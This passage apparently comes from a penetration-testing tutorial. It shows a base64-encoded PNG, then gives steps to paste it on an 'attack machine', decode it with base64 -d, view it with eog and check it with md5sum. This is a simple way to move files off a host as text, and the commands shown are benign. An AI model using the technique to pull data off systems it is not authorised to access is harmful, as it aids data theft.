+Y/vzDOADOlZWVCysrK79VFOU3nZ2dA9euXVNu3LjB2bNnyeVybGxskMvpYIDX65V5sKgHarWavLnEzSluPEAaU4immc71163W3W4Xe3t77Ozs4Pf7SSQTFAtF9jJ7Utvz8ePH5PN5JicnCQaDVKtVXr58yfLyMufOnaNSqRCPx+nt7SUUCrG2tsbS0hJjY+OUyyesra3R39+Pz+sFr5fDfJ6nT58SCASIRqN0dHTI+eRSqcTi4iKDg4OMjY1JtOuLL74glUqRTCbx+Xy4XC6i0ahua2MoUAwMDGC323E4HBJadLlc0oc1l8vJJ0QwGGRkZITLly/z5MkT7t6921xdXf26XC7/rdVqfW1wsBofQzB9LEEvGavAMfAN8E29Xv9DOp3um56e/nJ6evqGy+X6KhwOd125csVy7RfXGBwcpFatkUgk2N3dlYQ3n88nocZGo0m9XpOEuGazicPh4MyZMzSbTSwWi7RcPzk5IZPJsLu7S7FYlJDe9vY2qqrKIm53d5fj42OSyaS0IUomk5TLZXlrqqrKyckJGxsbFAoFQqEQukx6jmw2KyeI3G436XSa/f19+f0VRZGjmcJhL5VKSV9Vi8VCIBCgu7tbl602tu4oYzcGe9zyvSqVCkdHul5MJpPBarUSiUQ4ffo0TqeTV69eMTMzw9TU1HI2m51utVr/BFaN/8VHt6x83KsKrBv7r6VSybG2tjawtrb21b17936pKMqVcDgcjsVitkuXLjE6OorP55O3mB5cRUCHQZ1OJ4qiSH7/h0Pv7SzR9jpCTPWIg6EbzLlkYFcqFVkItge8QJ8AEokEBwcHdHZ20t/fT7FY5PDwUFKyR0dHpcJEq9WSpDy/3y8beAJvt9lsksYtNB41TZOGBrmcytZWnGq1it1uJxAIEAgEpFrY0tISs7Oztc3Nzeeqqv4LfdB6BX2A6KNfVj6tVQa+N/bder1ujsfjvfF4fGx2dvYKMGG1Wif6+vqCw8PDjuHhYQYHByWz8+TkBFVVOTo6olKpSC6PSAE8Ho98QrTDmULJTVCfRcHZDkm2y6WcOnUKRVEAjXpdzwhGRkbeyaVoYLFaDHzcjNmso0aKYpWHUhgKm0zvMx11qxndA6xUKsn+hoAXRZ5us9nY398nHo9z//798tbW1nfZbPZ7gzryzOBP1fkEl5VPe7XQhw1SRiOERqPB5ubmzzY3N2MPHjy4ApwDBiwWy2BfX1/n0NCQ0t/fbxZ8b1G8CtNoMQ0mFCDkD2mowLWrwYlGmjgkiqLoHVGJ2Qs8/R1mLwahxWeK71yvVzk5KUmItv0Qic8XTTtxu9tsNiqVCgcHB2xsbBCPx0uvX79O5vP5JPCdkSa+ApJ8RsvK57myxv63+EOz2WRrayuwtbV1BhgFJoDTQBfQ6fF4Tvn9fncwGLRHIhFrV1eXye/3mzwej8SyxW3b7sErDKYF1t8ujNWuNW8xv5NDEWiLOCjitZCxE24wIhc3CF7NnZ2dUi6XK+TzebVareaABPACXSXgNW3KvfBD4yc/Bf3nslRjv/gwMIrFIsXjojuZTHY9e/asB4gAZ4AoEAQ6AA/gAKwmk6lDURRrR0dHh6IoZpvNZlYUxaYoisVsNmvtDSo0aLaaWqPRaDUajVqtVmvV63WtVqvVKpVKvdlsVo1Uo2zsHSP9SABvDYgwzf84IP25rv8AEEWbpbyRt8wAAAAASUVORK5CYII=
on the attack machine, open a text editor, paste and save the previously copied base64 output:

$ nano b64image.png

 <paste the above output>
 <save & exit>
Next, use the base64 command with the -d switch to decode the newly created file and direct that output to a new file called logoCyber.png

$ base64 -d b64image.png > logoCyber.png
Finally, open the file in an image editor to view contents

$ eog logoCyber.png
Figure 1: Final Image



For additional verification and to ensure all data was properly copied, md5sum both image files and confirm that they match




